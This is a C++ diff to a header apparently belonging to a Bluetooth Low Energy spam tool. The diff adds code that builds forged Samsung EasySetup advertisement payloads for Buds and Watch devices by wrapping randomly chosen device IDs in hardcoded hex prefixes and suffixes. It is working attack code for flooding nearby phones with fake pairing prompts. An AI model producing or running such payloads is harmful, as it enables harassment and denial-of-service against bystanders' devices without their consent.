@@ -18,18 +18,32 @@ class advertisementGenerator {
         return it->first;
     }
 
+    static std::string hexToBytes(const std::string& hex) {
+        std::string bytes;
+        bytes.reserve(hex.size() / 2);
+        for(size_t i = 0; i < hex.size(); i += 2) {
+            bytes.push_back(static_cast<char>(std::stoi(hex.substr(i,2), nullptr, 16)));
+        }
+        return bytes;
+    }
+
 
 public:
     explicit advertisementGenerator(const std::map<std::string, std::string> &genuineBudsIds,
         const std::map<std::string, std::string> &genuineWatchIds)
         : genuineBudsIds(genuineBudsIds), genuineWatchIds(genuineWatchIds) {};
 
+    // Returns full payload for EasySetup Buds (prefix + device ID)
     std::string getGenuineBudsAdvertisement() const {
-        return pickRandomKey(genuineBudsIds);
+        const std::string prefix = "42098102141503210109";
+        const std::string suffix = "063C948E00000000C700";
+        return hexToBytes(prefix) + hexToBytes(pickRandomKey(genuineBudsIds)) + hexToBytes(suffix);
     }
 
+    // Returns full payload for EasySetup Watch (prefix + device ID)
     std::string getGenuineWatchAdvertisement() const {
-        return pickRandomKey(genuineWatchIds);
+        const std::string prefix = "010002000101FF000043"; // EasySetup Watch prefix
+        return hexToBytes(prefix) + hexToBytes(pickRandomKey(genuineWatchIds));
     }
 };
 #endif //BTMAGUS_BLE_SPAM_H
